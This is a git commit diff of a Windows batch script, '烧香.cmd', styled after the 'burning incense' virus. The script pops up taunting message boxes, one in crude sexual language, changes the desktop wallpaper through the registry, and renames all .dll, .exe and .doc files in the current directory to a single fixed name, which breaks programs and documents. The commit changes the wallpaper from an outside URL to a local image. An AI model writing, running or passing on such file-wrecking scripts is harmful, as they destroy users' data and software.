fffc70d01d10dd3814971673a64fa5f6e197badd
新·省附人 <90961131+sferproject@users.noreply.github.com>
2022-01-01 18:52:47 +0800

    Update 烧香.cmd

--- 烧香.cmd
+++ 烧香.cmd
@@ -1,7 +1,6 @@
-cd /d C:
 mshta vbscript:msgbox("姚美丽，正烧香，你的笑容已泛黄",64,"南阳电脑中级高手")(window.close)
 mshta vbscript:msgbox("恭喜你，你的电脑遭受到了强奸，现在你的电脑已经被艹烂了，五十秒钟后，你的电脑将会进入烧香状态",50,"南阳电脑中级高手")(window.close)
-reg add "hkcu\control panel\desktop" /v wallpaper /d "http://sfercongbbs.ticp.io/virus-photo/minglingshaoxiang.png" /f
+reg add "hkcu\control panel\desktop" /v wallpaper /d "mlsx.png" /f
 rename *.dll 姚美丽给我们开网
 rename *.exe 姚美丽给我们开网
 rename *.doc 姚美丽给我们开网
